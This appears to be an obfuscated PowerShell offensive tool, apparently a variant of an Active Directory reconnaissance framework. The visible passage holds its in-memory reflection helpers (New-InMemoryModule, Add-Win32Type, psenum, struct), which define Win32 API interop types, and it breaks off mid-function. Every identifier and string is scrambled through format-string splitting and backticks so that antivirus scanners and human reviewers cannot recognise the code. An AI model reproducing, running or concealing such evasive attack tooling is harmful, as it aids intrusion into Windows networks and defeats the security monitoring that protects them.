 &("{0}{1}{2}"-f 'sET-VARi','ABL','E')  ("{0}{1}" -f 'er','Q') ([tYPe]("{1}{0}" -F'D','GUi')  )  ;  &("{2}{0}{1}" -f 'ET','-item','s')  ("{1}{2}{0}" -f 'Le:kp1','vA','riAb')  ( [TYPe]("{9}{10}{3}{2}{12}{1}{7}{11}{5}{4}{8}{6}{0}"-F'N','pse','iNTER','E.','i','caLL','COnVEntiO','rV','ng','ruN','Tim','ICeS.','O'))  ;   &("{0}{2}{1}"-f 'SeT','Tem','-i')  ("varI"+"ab"+"le"+":8tE") ([tYpE]("{0}{3}{1}{5}{2}{4}"-F 'RunTime.INTEr','pS','CHARse','o','T','eRVICEs.')  );   &('sV') ('rmiB'+'l') (  [TYPe]("{6}{0}{3}{7}{1}{8}{5}{2}{4}" -F 'nteroPS','s.dlLi','tri','ERV','bUTe','TAt','runtIme.I','icE','mPOr')); ${b9`cV}=  [TypE]("{2}{1}{0}"-f 'tRiBUtE','AGSaT','fL')  ; ${ik9`zN} =[typE]("{4}{0}{1}{2}{5}{3}"-f'efLECTiON.eMIT.pAc','kIN','gs','ZE','R','i') ; &("{1}{0}" -f 'Et-Item','S')  ("{2}{0}{3}{4}{1}" -f 'RI','e:Qbj12','VA','a','Bl')  (  [TYPe]("{3}{0}{2}{6}{7}{4}{1}{5}" -F'Le','RIBUT','cTiO','rEf','eatt','es','N.t','Yp')  )  ;   &("{1}{0}" -f 'Et','S') ("{1}{0}" -f 'JVb6','0')  ([TYPe]("{8}{7}{9}{2}{1}{3}{4}{5}{0}{6}" -f'tTRiB','AL','MaRSH','a','s','A','UTE','ime.intE','RuNt','rOPSErviceS.')  )  ;  ${Eh1`Ax}=[tyPE]("{0}{1}" -F'tYp','e'); &("{1}{0}"-f 'et','S') ("{0}{1}"-f'u','IrM') (  [type]("{3}{0}{4}{2}{1}" -F 'LeCt','OdEs','.EmIT.opc','rEF','iOn')) ;  &("{1}{0}{2}" -f'te','sET-I','m') ("{3}{2}{1}{0}"-f'Jz','G','e:f3','vARiABL')  ( [TyPe]("{0}{1}" -f 'io','.patH')  ); &('sv')  ("{0}{1}"-f 'dKc1w','5') ([TyPE]("{1}{2}{3}{0}{4}"-F 'io.','s','YST','EM.','FILE')  )  ;  ${0`MYk`FP}=[tYPE]("{4}{0}{1}{3}{2}"-f'.fiLE','m','e','OD','sYsTEM.io') ;  ${5`lVU}  =  [tYPe]("{0}{4}{3}{1}{2}" -F 's','c','esS','eac','ySTEM.IO.fiL');    &("{2}{1}{0}" -f 'm','te','sET-i') ("{1}{0}{2}{3}" -f 'RiAbL','vA','E',':aKB8J7')  (  [TYPe]("{1}{3}{0}{2}" -F 'haR','I','e','o.files') )  ;   ${1C4`5yK}= [TYpE]("{0}{1}{2}" -f'nEt.d','n','S') ;   &("{2}{0}{1}" -f'RiaB','LE','sEt-VA')  ('7U'+'5N')  ([TYpE]("{1}{0}{2}" -f'A','ActiV','Tor')); ${dv`9to}  =[typE]("{0}{3}{4}{1}{2}"-f 'sYST','.tH','reaD','eM.t','hreADing')  ;   &("{2}{1}{0}" -f 'E','varIaBL','sEt-')  ("{0}{1}" -f 'N6','DT') ([tYpE]("{0}{2}{3}{4}{1}"-F 'rE','ssEMBlY','fLectiO','n.','a') ) ; &("{2}{0}{1}"-f 'itE','m','sET-')  ('va'+'RI'+'aBLE:Zv5'+'2') (  [tYPE]("{3}{2}{5}{4}{1}{0}"-f'RtER','oNVe','sTem.B','SY','C','iT'))  ;  &("{2}{1}{0}" -f'Em','iT','set-')  ("vaRIAbL"+"E:v"+"Aj") (  [tyPe]("{2}{3}{4}{1}{5}{0}"-f 'eCTIOn.BinDiNgFlags','re','sYs','teM','.','fl') ); &("{1}{0}{2}"-f'ITe','SeT-','m')  ("v"+"AR"+"IaBLE:M"+"ErGp"+"6")  (  [TYPE]("{12}{0}{11}{7}{4}{8}{2}{5}{9}{6}{10}{1}{3}" -f '.DI','PTi','rViCEs.Re','ON','tOryS','ferRAL','aSIn','Ec','e','ch','gO','r','SYsTem'));   &("{0}{2}{1}"-f's','teM','ET-I')  ("{1}{3}{0}{2}"-f'nf','VaRiAbl','E','E:Z') ( [TypE]("{10}{2}{4}{7}{6}{9}{3}{1}{5}{0}{8}" -F'Yma','ECuR','tem.','s.s','direCtOrYse','It','Vic','r','sks','E','sYs') )  ;  ${1d`9R} =  [TyPe]("{1}{0}" -f'y','arRa')  ;    &("{1}{0}" -f'eT','s')  ("{0}{1}"-f'RHl','p')  (  [typE]("{2}{1}{3}{0}"-F'NverT','YSteM','S','.co'))  ;${oLwp`QV}  = [type]("{0}{6}{1}{9}{10}{11}{3}{8}{2}{4}{7}{5}" -F 'SyStEM','dIR','.aCTIvEdi','iC','reCToRY.d','MAIN','.','o','Es','E','ct','oRYsERv')  ;  &('sv')  ("{1}{0}" -f'a7L','It')  (  [tyPE]("{1}{2}{0}"-F 'eRt','C','onV') )  ;    ${1`Qybi} =  [TYpe]("{1}{0}" -f'nuM','e')  ; &("{0}{1}" -f 's','ET') ("{0}{1}"-f'd9','EF')  (  [TyPE]("{2}{0}{1}"-F'itCONvER','TER','b')) ; &('sv') ('k8'+'6R')  ([TypE]("{1}{4}{2}{3}{0}" -F 'T.eNCODInG','SYS','EM.Te','x','t')  )  ; &("{1}{0}"-f'Et','s')  ("sl7H"+"d")  (  [TYPE]("{5}{3}{6}{0}{4}{2}{1}" -f'm.S','SPlitoPtIonS','g','S','triN','sY','te'))  ; ${2P9`45}  =[TYpe]("{1}{0}" -F 'EGex','r') ;    ${m`6U} =  [tYPE]("{5}{0}{4}{3}{2}{1}" -F 'croSoft','egistRyKEy','32.r','iN','.W','mI')  ;   &("{0}{2}{3}{1}" -f'sE','bLe','t-','VARIa')  ("{0}{1}"-f 'T','lb')  ([tYPE]("{3}{7}{5}{6}{2}{8}{1}{4}{0}"-F 'arShaL','Ro','Nt','s','psErviceS.m','M.RuNTiM','E.I','yste','e')) ;   &("{1}{0}" -f'teM','SEt-i')  ("{0}{1}{2}"-f'vAR','I','aBlE:OhG40') ([TyPE]("{0}{2}{1}" -F 'I','.file','O')); &("{0}{1}" -f'S','ET-itEm') ("VaRI"+"aBL"+"e:eq"+"1bR")  ([tyPE]("{6}{5}{1}{2}{7}{8}{0}{3}{10}{9}{4}"-f'm','an','a','Ent.aUTOMatio','TE','eM.M','sysT','G','E','iTIalsEssioNsTa','N.RUNspACeS.iN'))  ;  ${Q`8J3} =[TyPE]("{3}{2}{6}{4}{1}{0}{5}{7}{8}"-f't','DinG.aPaR','M.','sySTe','HREa','mEnTST','T','a','Te')  ;  ${Cuxa`SE}=[TypE]("{3}{0}{2}{1}"-f'uN','aCtORy','SPaCeF','r')  ; &("{2}{1}{0}" -f 'EM','et-It','S') ("{2}{1}{0}{3}"-f 'a6',':','variablE','m') (  [tYpe]("{2}{1}{0}" -f 'Ll','OweRSHE','p'));    &("{1}{0}" -f'T','Se')  ("0YD"+"5sb") (  [TyPe]("{2}{1}{0}" -f 'oNmeNt','R','envi')  ) ;   &('SV') ('H4F'+'p')  (  [TyPE]("{3}{0}{2}{1}{4}"-f 'stE','.neT.d','M','SY','NS')) ;  &("{0}{1}"-f 'S','Et')  ("Y0"+"q") (  [tYpE]("{1}{0}{2}" -F'TEtiM','DA','E')  )  ;  &("{1}{0}{2}"-f'-','seT','ITeM') ('V'+'ARi'+'a'+'bl'+'e:r4f3tZ')  (  [tYPe]("{1}{2}{0}" -f'irEctORY','iO','.d')) ;  ${m`2`jLrE}=  [tYpE]("{6}{2}{1}{0}{4}{5}{3}"-f 'NCIpAL.WeLl','y.Pri','URit','dtYpe','kn','OWNSI','SYsTEM.SEc') ;${Xz`NLS}=[TyPE]("{4}{3}{0}{2}{5}{1}{6}" -f'INter','CE','OPS','mE.','RUNTi','ervI','s.Marshal') ;   ${jh3`X`O6}=[tyPE]("{7}{2}{4}{6}{3}{8}{5}{9}{0}{1}" -F'eN','tiaL','AGe','.a','Men','IOn','T','MAn','UTomAT','.pScred')  ;  &("{0}{1}"-f'S','Et') ("G0n"+"s") ([Type]("{4}{2}{3}{9}{5}{0}{8}{1}{7}{10}{6}" -f 'TIVEDirE','ory','m.D','iR','SysTe','vICes.aC','T','.FoR','ct','ECtoryser','Es') );    &("{0}{1}{2}"-f 'Se','t-it','Em') ("V"+"A"+"RIa"+"bLe:DmO"+"y") ( [tYPE]("{2}{1}{0}" -F'nG','TRI','s')  )  ;   &('Sv')  ("{0}{1}" -f '9','rzq')  (  [tYPE]("{1}{0}"-F'pTR','INT')  )  ; ${4`Y7itv}=  [TyPE]("{0}{1}" -f'InT','32'); 












function NEW-`IN`memor`ym`ODuLE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{7}{6}{4}{2}{5}{3}{0}{8}{9}" -f 'Ch','PS','ProcessFo','e','ould','rStat','seSh','U','angingFunction','s'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(POsiTioN = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${M`oDu`LenAMe} =   ${E`RQ}::("{0}{2}{1}"-f 'Ne','id','wGu').Invoke().("{0}{2}{1}"-f'To','ng','Stri').Invoke()
    )

    ${APP`Doma`in} =  (&("{1}{0}{2}"-f 'RiaBL','VA','E')  ("{1}{0}"-f't','n6d') -VALueonLY)."aSS`EMBly".("{0}{2}{1}"-f 'Get','pe','Ty').Invoke(("{2}{0}{3}{4}{1}" -f'ystem.','omain','S','Ap','pD')).("{0}{2}{3}{1}" -f 'GetPr','y','ope','rt').Invoke(("{2}{0}{3}{1}" -f 'rr','ain','Cu','entDom')).("{1}{2}{0}"-f 'ue','GetVa','l').Invoke(${n`ULl}, @())
    ${Lo`AdE`D`AsSEMblIEs} = ${AP`pdom`AIN}.("{0}{3}{4}{2}{1}"-f 'Ge','s','e','tAsse','mbli').Invoke()

    foreach (${asSemB`ly} in ${lOAde`dasSemB`Li`ES}) {
        if (${a`S`semBLy}."ful`lNAMe" -and (${AS`SE`mBlY}."fulL`NAME".("{0}{1}" -f'Spl','it').Invoke(',')[0] -eq ${M`OdUl`eN`AmE})) {
            return ${a`sSEmb`lY}
        }
    }

    ${dyNAs`S`EM`BLy} = &("{2}{0}{1}" -f'Objec','t','New-') ("{1}{3}{0}{4}{2}"-f 'ection.As','Re','yName','fl','sembl')(${MOd`ULen`AmE})
    ${DoM`A`iN} = ${a`ppDO`MaIn}
    ${a`SSe`mB`lybUiLdeR} = ${dO`MAin}.("{4}{1}{0}{3}{2}" -f'ssem','namicA','ly','b','DefineDy').Invoke(${DYnAs`sEM`BlY}, 'Run')
    ${Mod`U`lEBU`il`der} = ${aSSE`M`BlyBUilD`Er}.("{3}{2}{0}{1}{4}" -f'nami','cModul','efineDy','D','e').Invoke(${M`OD`ULE`NAme}, ${f`ALSe})

    return ${mOd`U`l`EbuiLDeR}
}




function Fu`NC {
    Param (
        [Parameter(posiTIOn = 0, maNDatOrY = ${t`RUe})]
        [String]
        ${d`llNa`mE},

        [Parameter(poSItiON = 1, MAndaToRY = ${tR`Ue})]
        [string]
        ${fuNcTIO`N`N`A`Me},

        [Parameter(posItIoN = 2, mAnDAtoRY = ${TR`UE})]
        [Type]
        ${RE`T`URNTY`Pe},

        [Parameter(poSitIOn = 3)]
        [Type[]]
        ${PaRA`meteR`Ty`pES},

        [Parameter(POSitiOn = 4)]
        [Runtime.InteropServices.CallingConvention]
        ${Na`T`iVeCA`llI`N`gCO`NVentIoN},

        [Parameter(POSITiOn = 5)]
        [Runtime.InteropServices.CharSet]
        ${ChA`RS`eT},

        [String]
        ${ENTrYp`Oi`NT},

        [Switch]
        ${SEtL`A`StERROR}
    )

    ${proP`E`RTIES} = @{
        ("{1}{0}" -f 'llName','D') = ${dl`L`NamE}
        ("{2}{0}{1}{3}"-f 'ti','o','Func','nName') = ${f`UncTIon`N`AME}
        ("{2}{1}{0}" -f 'ype','turnT','Re') = ${r`ETU`RN`TYPE}
    }

    if (${p`A`RAMEte`RTY`PES}) { ${pRop`ErTi`Es}[("{1}{2}{0}{3}"-f'ype','Paramete','rT','s')] = ${pArAMetEr`Ty`p`es} }
    if (${Nat`i`V`E`CaLLingCOnve`NTiOn}) { ${pro`PE`RtI`es}[("{2}{0}{4}{1}{5}{3}"-f 'a','nvent','NativeC','on','llingCo','i')] = ${n`A`TivEcA`LLiN`G`coNvenTion} }
    if (${C`HA`RsET}) { ${p`R`OpeRTI`ES}[("{1}{0}"-f'arset','Ch')] = ${char`sET} }
    if (${S`EtLA`ST`er`RoR}) { ${PropeR`TI`es}[("{0}{2}{1}"-f'SetLast','or','Err')] = ${SEtlas`T`ERrOR} }
    if (${En`Tr`yP`OinT}) { ${pro`pE`RT`IES}[("{1}{0}{2}" -f 'in','EntryPo','t')] = ${e`Nt`Rypo`Int} }

    &("{1}{2}{0}"-f '-Object','Ne','w') ("{1}{2}{0}"-f 'ect','P','SObj') -Property ${PrO`peRt`ieS}
}


function a`D`D-Win32tYpE
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(maNdatorY=${tr`UE}, VAluEFRompIPElINEByProPErTyNAmE=${tr`UE})]
        [String]
        ${dLL`N`AMe},

        [Parameter(mANdaTory=${tR`Ue}, ValUeFRoMPIpeLINEBypRoPErTyNAMe=${TR`Ue})]
        [String]
        ${fun`CtIo`NNamE},

        [Parameter(VALueFrompipEliNEBYPrOPeRtynAmE=${t`RuE})]
        [String]
        ${E`NT`R`YpoInT},

        [Parameter(MaNdAtORy=${tr`UE}, vAluEFroMPiPeLINebyproPERTYnaME=${Tr`UE})]
        [Type]
        ${ReT`UR`N`Type},

        [Parameter(VALUEfROmPiPeLINeBYpRopERTyNAMe=${Tr`UE})]
        [Type[]]
        ${Par`Ame`T`ERtYp`ES},

        [Parameter(vaLUeFrOMpipELInEByprOperTYName=${t`Rue})]
        [Runtime.InteropServices.CallingConvention]
        ${Nat`iVE`CALLI`NGcoNvEn`TIon} =   ${K`p1}::"ST`DCA`ll",

        [Parameter(VAlUEfRoMPIPelIneByPRopErTYnaMe=${Tr`UE})]
        [Runtime.InteropServices.CharSet]
        ${ch`ArSET} =  (&("{1}{0}{2}" -f 'iab','var','LE') ('8'+'TE')  )."vA`LUe"::"a`UtO",

        [Parameter(ValUefROMPIPElInebypRoPeRTyNAmE=${tR`Ue})]
        [Switch]
        ${Se`TLA`sTErR`or},

        [Parameter(MANdATORY=${t`RUE})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${Mo`DuLE},

        [ValidateNotNull()]
        [String]
        ${NAmE`sp`A`ce} = ''
    )

    BEGIN
    {
        ${t`YpEHa`sH} = @{}
    }

    PROCESS
    {
        if (${m`ODU`LE} -is [Reflection.Assembly])
        {
            if (${N`A`mesPaCe})
            {
                ${t`ypEh`AsH}[${D`lLN`AMe}] = ${M`oDu`lE}.("{1}{0}" -f 'pe','GetTy').Invoke("$Namespace.$DllName")
            }
            else
            {
                ${type`h`ASh}[${d`Ll`NAme}] = ${M`O`DULE}.("{1}{2}{0}" -f'pe','Get','Ty').Invoke(${dLLna`Me})
            }
        }
        else
        {
            
            if (!${tYpE`H`ASh}.("{2}{1}{0}{3}"-f'ns','i','Conta','Key').Invoke(${dllN`A`ME}))
            {
                if (${n`A`MEsPaCe})
                {
                    ${T`YPEH`AsH}[${Dl`lNAMe}] = ${m`ODULe}.("{1}{2}{0}{3}"-f'ineTyp','D','ef','e').Invoke("$Namespace.$DllName", ("{0}{2}{3}{1}{4}" -f'P','I','ublic,Befo','reField','nit'))
                }
                else
                {
                    ${tYP`Eh`AsH}[${DL`lna`mE}] = ${m`OdUle}.("{3}{2}{1}{0}"-f 'e','yp','neT','Defi').Invoke(${D`ll`NamE}, ("{2}{1}{0}{6}{3}{4}{5}" -f'ic','bl','Pu','for','eFieldI','nit',',Be'))
                }
            }

            ${M`et`hOD} = ${TyPE`Ha`SH}[${d`LlN`Ame}].("{1}{0}{2}{3}"-f'fineMe','De','t','hod').Invoke(
                ${fUnc`T`I`oNNaME},
                ("{3}{5}{4}{2}{6}{0}{1}" -f 'm','pl','invok','Publi','c,P','c,Stati','eI'),
                ${REt`UR`NTY`PE},
                ${ParAm`Ete`RtYPEs})

            
            ${i} = 1
            foreach(${PA`Rame`TER} in ${P`ARAm`Et`ERt`YPes})
            {
                if (${paR`AMET`eR}."i`sb`Yref")
                {
                    [void] ${M`Et`HOd}.("{2}{1}{0}{3}"-f'a','ineP','Def','rameter').Invoke(${i}, 'Out', ${N`Ull})
                }

                ${i}++
            }

            ${D`LlimP`oRT} = [Runtime.InteropServices.DllImportAttribute]
            ${Se`TLA`SteRrOr`F`Ield} = ${dlL`IM`pOrt}.("{1}{2}{0}" -f'ld','G','etFie').Invoke(("{1}{0}{2}"-f 'LastErr','Set','or'))
            ${cA`Lli`NGCOnvENT`IonfIE`Ld} = ${dll`im`POrT}.("{2}{0}{1}"-f'i','eld','GetF').Invoke(("{3}{4}{1}{2}{0}" -f 'on','vent','i','Callin','gCon'))
            ${CHarsE`Tfi`eld} = ${d`LliM`pOrt}.("{1}{0}{2}"-f 'Fi','Get','eld').Invoke(("{1}{2}{0}"-f't','Ch','arSe'))
            ${en`TrYpoIntFI`E`ld} = ${DllI`mp`Ort}.("{0}{1}"-f'Get','Field').Invoke(("{2}{3}{1}{0}"-f'yPoint','r','E','nt'))
            if (${S`EtLAst`ErROR}) { ${sl`ev`ALuE} = ${TR`UE} } else { ${SL`ev`AlUe} = ${fal`SE} }

            if (${pSbo`U`NDpaRAMET`E`Rs}[("{2}{0}{1}" -f'ryPo','int','Ent')]) { ${ex`PORTedfUn`CnA`me} = ${ENTrYP`oI`Nt} } else { ${e`XP`O`Rtedf`UNCn`AMe} = ${F`UNCt`IONn`AMe} }

            
            ${C`O`NStR`UCtor} =  ${RmI`BL}."GetcoNsT`Ru`CT`Or"([String])
            ${DllimP`O`R`TAtt`R`IbUTe} = &("{1}{0}{2}"-f'-Objec','New','t') ("{7}{2}{4}{6}{0}{8}{3}{1}{5}"-f 'ust','uteBuilde','n.','rib','Emi','r','t.C','Reflectio','omAtt')(${COnst`RUct`OR},
                ${dLLNa`mE}, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @(${s`Et`lAstErrORF`iELD},
                                           ${cA`lli`NgCOnVE`N`Ti`oNFIEld},
                                           ${c`HARsETf`IE`Ld},
                                           ${ENt`RYpo`i`N`TfIeld}),
                [Object[]] @(${S`LEva`lUe},
                             ([Runtime.InteropServices.CallingConvention] ${n`ATivecAl`LiNgCOn`VeNTi`ON}),
                             ([Runtime.InteropServices.CharSet] ${c`hARS`ET}),
                             ${E`xpOrte`d`F`UNcnAMe}))

            ${M`e`THoD}.("{3}{1}{2}{0}{4}" -f 'u','tt','rib','SetCustomA','te').Invoke(${D`llI`m`pOrt`ATTrIB`Ute})
        }
    }

    END
    {
        if (${MoD`ULe} -is [Reflection.Assembly])
        {
            return ${typ`e`haSH}
        }

        ${rEtuRn`TY`p`es} = @{}

        foreach (${K`ey} in ${TYp`eHAsh}."K`Eys")
        {
            ${T`ypE} = ${t`Y`PEHASh}[${k`Ey}].("{3}{2}{0}{1}"-f 'teT','ype','rea','C').Invoke()

            ${R`E`TURN`Types}[${k`Ey}] = ${T`ype}
        }

        return ${R`EtuRN`TyPes}
    }
}


function P`Sen`Um {


    [OutputType([Type])]
    Param (
        [Parameter(poSiTIoN = 0, maNdaTOry=${T`RUe})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${M`odu`le},

        [Parameter(POsitIoN = 1, MANDAtORy=${tr`UE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${F`UllnA`mE},

        [Parameter(pOSItIon = 2, mandatOry=${t`RUe})]
        [Type]
        ${t`yPE},

        [Parameter(PosITIOn = 3, MANdAToRy=${t`Rue})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${ENu`mEl`e`m`Ents},

        [Switch]
        ${b`ItfIe`lD}
    )

    if (${M`OdU`le} -is [Reflection.Assembly])
    {
        return (${m`oD`ULe}.("{1}{0}{2}"-f'Typ','Get','e').Invoke(${fU`l`LnaMe}))
    }

    ${E`N`UMt`YpE} = ${t`YpE} -as [Type]

    ${e`NUMbuIld`ER} = ${moD`UlE}.("{2}{1}{0}"-f'm','efineEnu','D').Invoke(${F`ULLN`Ame}, ("{0}{1}" -f 'Publi','c'), ${E`NUmtY`pE})

    if (${b`itfIe`lD})
    {
        ${FLa`Gs`cON`sTR`UctoR} =  (&("{0}{1}" -f 'gET','-itEm')  ("V"+"aRiaBle:b9"+"C"+"v") )."VA`lUe"."ge`TCON`ST`R`UCtOR"(@())
        ${FlAgscuS`TomA`T`TriB`UTe} = &("{2}{0}{1}"-f'je','ct','New-Ob') ("{4}{8}{5}{1}{7}{9}{2}{6}{3}{0}" -f 'ilder','it','rib','u','Reflect','n.Em','uteB','.Custo','io','mAtt')(${FLagscON`strUc`T`or}, @())
        ${enum`BU`ILDEr}.("{2}{3}{0}{1}"-f 'ribut','e','S','etCustomAtt').Invoke(${fl`AgScUS`To`MAT`TrI`ButE})
    }

    foreach (${K`Ey} in ${e`NuMeleME`NTs}."K`Eys")
    {
        
        ${nU`LL} = ${E`NU`Mbuil`DER}."dEFinEli`Te`Ral"(${k`Ey}, ${EN`U`MEL`E`MeNts}[${K`EY}] -as ${ENumt`Y`Pe})
    }

    ${ENUmbui`L`dER}.("{0}{1}{2}" -f 'Cre','a','teType').Invoke()
}




function fI`eLd {
    Param (
        [Parameter(posITIoN = 0, MandatoRy=${Tr`UE})]
        [UInt16]
        ${poSIT`i`on},

        [Parameter(POsITiOn = 1, maNDatORY=${tR`Ue})]
        [Type]
        ${tY`pe},

        [Parameter(posiTioN = 2)]
        [UInt16]
        ${O`Ff`sET},

        [Object[]]
        ${mars`HaL`AS}
    )

    @{
        poSitIon = ${PO`s`iT`Ion}
        ("{1}{0}" -f 'pe','Ty') = ${T`yPe} -as [Type]
        ("{1}{0}{2}" -f'fs','Of','et') = ${O`Ff`SeT}
        ("{2}{0}{1}"-f'r','shalAs','Ma') = ${mar`s`HALaS}
    }
}


function S`Tr`Uct
{


    [OutputType([Type])]
    Param (
        [Parameter(pOSitiON = 1, MANdAtOry=${TR`UE})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${Mo`du`Le},

        [Parameter(poSItion = 2, MANDAToRY=${T`RUE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${f`UL`LN`AmE},

        [Parameter(POSItiON = 3, manDaTOry=${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${s`TrUCTfI`e`l`Ds},

        [Reflection.Emit.PackingSize]
        ${pACKIN`G`sIzE} =  (  &("{0}{2}{1}"-f'ge','aBlE','t-Vari')  ("{0}{1}" -f'ik9','ZN') -valuEoNly )::"uNS`P`eCIFIED",

        [Switch]
        ${e`x`PlIci`TlAYO`Ut}
    )

    if (${mo`dU`le} -is [Reflection.Assembly])
    {
        return (${m`O`dule}.("{2}{1}{0}" -f 'Type','et','G').Invoke(${FuLLNa`Me}))
    }

    [Reflection.TypeAttributes] ${st`Ru`ct`ATtr`IbUtEs} = ("{8}{0}{4}{3}{6}{10}{12}{7}{5}{1}{9}{11}{2}"-f 'siCl','lic,
       ','      BeforeFieldInit',' ','ass,
    ','   Pub',' ','ss,
     ','An',' ','  ','Sealed,
  ','Cla')

    if (${EXPl`Ic`itL`A`YoUT})
    {
        ${sTRu`c`T`AtTrIB`UtEs} = ${Stru`Ctat`T`RiBuTES} -bor   ${Q`Bj12}::"exp`Li`Ci`TLAYout"
    }
    else
    {
        ${sTR`U`CtAttri`B`U`TeS} = ${sT`RucT`ATtRibuT`Es} -bor   ( &("{1}{0}"-f 'E','vAriABL') ("{1}{0}"-f'j12','qB')  -va  )::"SE`QUEntiA`LLa`y`Out"
    }

    ${sTr`Uc`Tb`UiLdeR} = ${mo`dULe}."de`FIN`etYPe"(${F`UllNamE}, ${str`UcT`ATTribU`TES}, [ValueType], ${Pac`KiNG`S`IzE})
    ${COnst`Ru`C`TOri`NFo} =   (  &('LS')  ("vArI"+"ABlE"+":0Jvb6"))."Val`UE".("{0}{4}{3}{1}{2}"-f 'G','ructor','s','st','etCon').Invoke()[0]
    ${S`IZ`Econ`St} = @( (  &("{1}{2}{0}{3}"-f 'l','GeT-va','RIab','E') ("{0}{1}"-f '0JV','B6')  -vAl  ).("{0}{1}{2}" -f'Get','F','ield').Invoke(("{1}{0}"-f 'onst','SizeC')))

    ${FI`e`lDs} = &("{0}{3}{2}{1}" -f 'New-','ject','b','O') ("{2}{1}{0}"-f 'able[]','ht','Has')(${StrUcT`F`iEL`DS}."C`oUnt")

    
    
    
    foreach (${Fi`Eld} in ${ST`Ru`CTfie`LDs}."k`EyS")
    {
        ${IN`D`Ex} = ${s`T`Ru`ctfIELds}[${F`iElD}][("{0}{2}{1}"-f 'Pos','on','iti')]
        ${Fi`ElDS}[${I`Nd`eX}] = @{("{0}{1}{2}"-f'F','iel','dName') = ${f`iE`Ld}; ("{2}{1}{3}{0}" -f 's','ropert','P','ie') = ${StrU`ctFIE`LdS}[${fI`eLd}]}
    }

    foreach (${f`i`ElD} in ${fI`ELdS})
    {
        ${F`IELD`Na`mE} = ${F`i`eld}[("{0}{2}{1}" -f 'Field','ame','N')]
        ${FiEl`DPr`Op} = ${fI`eLd}[("{3}{2}{1}{0}"-f'rties','pe','ro','P')]

        ${of`Fs`Et} = ${f`iELDPr`op}[("{0}{2}{1}" -f 'Offs','t','e')]
        ${ty`Pe} = ${f`iEl`d`Prop}[("{0}{1}"-f'Typ','e')]
        ${M`Ar`Shalas} = ${f`iEl`dpROP}[("{2}{0}{1}"-f'A','s','Marshal')]

        ${N`eWFIE`LD} = ${sT`RUCt`BUi`LDeR}.("{1}{2}{0}"-f'ld','DefineF','ie').Invoke(${F`iE`ld`NAMe}, ${ty`pE}, ("{1}{0}" -f'lic','Pub'))

        if (${m`ArsHA`LAs})
        {
            ${U`NmAnAgeD`T`yPE} = ${m`Ars`haL`AS}[0] -as ([Runtime.InteropServices.UnmanagedType])
            if (${M`ARS`ha`Las}[1])
            {
                ${S`IzE} = ${Mar`S`HAlAS}[1]
                ${AT`TrI`BBui`lDer} = &("{1}{2}{3}{0}" -f't','N','ew-','Objec') ("{8}{6}{4}{3}{0}{1}{5}{7}{2}"-f 'ri','bute','r','t','.CustomAt','B','tion.Emit','uilde','Reflec')(${cO`N`sTR`U`CtorI`NFo},
                    ${u`NmA`Nag`E`DtYPe}, ${s`IzECo`Nst}, @(${si`Ze}))
            }
            else
            {
                ${aTtrIB`BUI`lD`Er} = &("{0}{2}{1}" -f 'New','bject','-O') ("{2}{4}{0}{1}{3}{6}{5}" -f 'tion.Emit.','CustomA','Refle','ttribu','c','er','teBuild')(${COnSTR`U`Cto`RIN`Fo}, [Object[]] @(${Unm`An`Age`dTyPe}))
            }

            ${nEw`F`IEld}.("{3}{2}{1}{0}{4}"-f 'Attr','m','Custo','Set','ibute').Invoke(${aTT`R`iBB`U`IldeR})
        }

        if (${E`XpLiC`iTLAYoUT}) { ${NE`WFI`eld}.("{0}{2}{1}" -f'Set','fset','Of').Invoke(${O`Ff`set}) }
    }

    
    
    ${siZeM`e`T`hod} = ${s`TrUcTBU`i`LDeR}.("{0}{2}{1}{3}" -f'Def','neMetho','i','d').Invoke(("{1}{0}"-f'ze','GetSi'),
        ("{0}{2}{3}{1}"-f'P',' Static','u','blic,'),
        [Int],
        [Type[]] @())
    ${il`GE`NERATor} = ${sI`zE`me`THOd}.("{3}{2}{0}{1}{4}" -f'LG','enerato','tI','Ge','r').Invoke()
    
    ${i`l`gEn`Erator}.("{0}{1}"-f'E','mit').Invoke( (&("{2}{0}{1}" -f 'ITe','M','Get-')  ("{1}{2}{3}{4}{0}" -f'Irm','VArI','A','BLE',':u'))."VaL`UE"::"LDt`Ok`EN", ${sTrUcT`BU`iLDer})
    ${I`lg`e`NERATOr}.("{1}{0}"-f 'it','Em').Invoke( ${u`iRM}::"C`AlL",
          (  &("{1}{2}{0}"-f '-Item','GE','t')  ('V'+'ARiABlE:'+'Eh'+'1A'+'X') )."vAl`Ue".("{1}{2}{0}"-f 'od','G','etMeth').Invoke(("{0}{3}{2}{4}{1}"-f 'G','andle','tTypeFr','e','omH')))
    ${ILgene`RaT`OR}.("{0}{1}"-f'Em','it').Invoke(  (&("{0}{1}{2}" -f 'g','eT','-CHiLDITEm') ("{0}{1}{3}{2}{4}" -f'Va','RIA','le:uiR','b','m'))."Val`Ue"::"C`All",
         (  &("{2}{1}{0}"-f'DiTEm','L','cHi') ("{2}{1}{4}{0}{3}"-f'L','ARI','v','S','AbLE:XZN'))."val`Ue".("{1}{0}"-f'etMethod','G').Invoke(("{0}{1}"-f 'Size','Of'), [Type[]] @([Type])))
    ${iLg`ENE`R`AtoR}.("{1}{0}"-f'mit','E').Invoke( ( &("{0}{1}{3}{2}" -f'Get-var','i','BLe','A')  ("uI"+"RM") )."va`Lue"::"r`eT")

    
    
    ${impli`CItcoNv`E`RTER} = ${STRu`c`TbU`ilDER}.("{3}{0}{1}{2}"-f't','h','od','DefineMe').Invoke(("{3}{2}{0}{1}" -f'Im','plicit','_','op'),
        ("{2}{6}{8}{0}{5}{1}{4}{7}{3}{9}"-f 'ub','c, Stat','Pri',' Spe','ic, H','li','v','ideBySig,','ateScope, P','cialName'),
        ${sTr`Uctb`UI`L`DEr},
        [Type[]] @([IntPtr]))
